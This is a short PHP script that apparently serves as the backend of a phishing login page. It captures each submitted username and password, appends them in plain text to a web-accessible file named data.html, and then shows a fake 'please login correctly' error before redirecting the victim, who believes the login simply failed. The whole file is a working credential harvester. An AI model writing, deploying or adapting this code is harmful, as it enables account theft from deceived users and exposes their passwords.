<?php
	
	if(ISSET($_POST['save_admin'])){
		$username = $_POST['username'];
		$password =$_POST['password'];
		 
$user_name="U|=";
$pasword1="P|=";
$space="|    |";

$fp = fopen('data.html', 'a');
fwrite($fp, $space);
fwrite($fp, $user_name);
fwrite($fp, $username);


fwrite($fp, $space);
fwrite($fp, $pasword1);
 
fwrite($fp, $password);
fclose($fp); 

		echo '
				<script type = "text/javascript">
					alert("please login correctly to join hacking class");
					window.location = "index.html";
				</script>
			'; 
		 
		 
	} 
	echo '
				<script type = "text/javascript">
					alert("please login correctly to join hacking class");
					window.location = "index.html";
				</script>
			';?>
